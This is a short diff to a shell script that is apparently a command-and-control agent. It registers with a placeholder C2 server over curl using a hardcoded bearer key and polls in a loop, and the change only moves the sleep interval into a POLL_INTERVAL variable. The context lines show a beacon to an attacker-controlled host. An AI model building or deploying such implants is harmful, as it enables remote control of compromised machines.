@@ -2,6 +2,7 @@
 
 C2_SERVER_IP="http://C2-SERVER-IP:80"
 AUTH="MySecretKey123"
+POLL_INTERVAL=2
 
 AGENT_ID=$(curl -s -X POST -H "Authorization: Bearer $AUTH" $C2_SERVER_IP/register | jq -r .agent_id)
 
@@ -42,5 +43,5 @@ while true; do
         fi
     fi
 
-    sleep 2
+    sleep $POLL_INTERVAL
 done
